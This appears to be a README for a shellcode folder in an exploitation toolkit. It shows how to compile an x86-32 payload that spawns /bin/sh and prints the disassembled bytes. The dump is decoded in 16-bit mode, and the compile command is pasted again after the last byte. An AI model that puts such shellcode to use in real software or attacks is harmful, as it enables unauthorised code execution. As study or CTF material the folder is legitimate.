# Shellcodes

This folder contains some useful shellcodes, as well as `compile_asm.py` script.


## Compiling a shellcode

### Example

```
$ ./compile_asm.py open_shell_x86_32.asm -o compiled_shellcode
$ ndisasm compiled_shellcode
00000000  EB0D              jmp short 0xf
00000002  5B                pop bx
00000003  53                push bx
00000004  B80B00            mov ax,0xb
00000007  0000              add [bx+si],al
00000009  31C9              xor cx,cx
0000000B  31D2              xor dx,dx
0000000D  CD80              int 0x80
0000000F  E8EEFF            call 0x0
00000012  FF                db 0xff
00000013  FF2F              jmp far [bx]
00000015  62696E            bound bp,[bx+di+0x6e]
00000018  2F                das
00000019  7368              jnc 0x83
0000001B  00                db 0x00$ ./compile_asm.py open_shell_x86_32.asm -o compiled_shellcode
```
